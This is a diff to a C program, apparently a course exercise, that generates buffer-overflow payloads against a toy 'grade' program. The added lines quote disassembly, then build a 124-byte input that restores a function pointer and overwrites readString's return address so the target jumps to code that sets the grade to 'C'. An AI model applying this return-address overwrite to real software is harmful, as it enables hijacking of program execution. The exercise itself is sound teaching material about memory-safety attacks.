@@ -23,6 +23,27 @@ int main(int argc,char *argv[]) {
 	* so that &f = &checkName will be replaced with all 0s
 	*/
 	char E[76] = "Frank";
+	
+	/*
+	In disassemble main, we found:
+	0x00000000004007fe <+114>:   callq  0x4006fe <readString> 
+    0x0000000000400803 <+119>:   mov    $0x600dc0,%esi
+	......
+	0x000000000040081e <+146>:   movb   $0x43,0x20055f(%rip)        # 0x600d84 <grade>
+	that is to say, the return address of readString is "0x0000000000400803"
+	we try to change the return address to 0x000000000040081e, thus the grade can be changed into C.	
+	*/
+	char C[124] = "Frank";	
+	//Restore the address of method checkName
+	C[72] = 0x59;
+	C[73] = 0x08;
+	C[74] = 0x40;
+	C[75] = 0x00;
+	//change the return address
+	C[120] = 0x1e;
+	C[121] = 0x08;
+	C[122] = 0x40;
+	C[123] = 0x00;
 
 
 	switch(argv[1][0]) {
@@ -32,6 +53,9 @@ int main(int argc,char *argv[]) {
 		break;
 	case 'e':
 		write(1,E,76);
+		break;
+	case 'c':
+		write(1, C, 124);
 		break;
 	default:
 		break;
